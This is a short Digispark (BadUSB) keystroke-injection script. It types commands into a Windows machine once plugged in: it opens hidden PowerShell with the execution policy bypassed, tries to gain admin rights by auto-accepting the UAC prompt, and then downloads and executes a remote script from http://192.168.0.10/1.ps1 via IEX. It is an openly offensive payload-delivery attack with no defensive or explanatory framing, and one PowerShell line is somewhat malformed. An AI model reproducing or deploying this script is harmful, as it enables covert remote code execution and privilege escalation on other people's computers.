//powershell with admin access and payload delivery
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("powershell -ExecutionPolicy Bypass -WindowStyle hidden"); 
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("Start-Process -ExecutionPolicy Bypass -WindowStyle hidden -WindowStyle powershell -Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("(New-Object System.Net.WebClient).DownloadString('http://192.168.0.10/1.ps1') | IEX");
  DigiKeyboard.delay(1000);
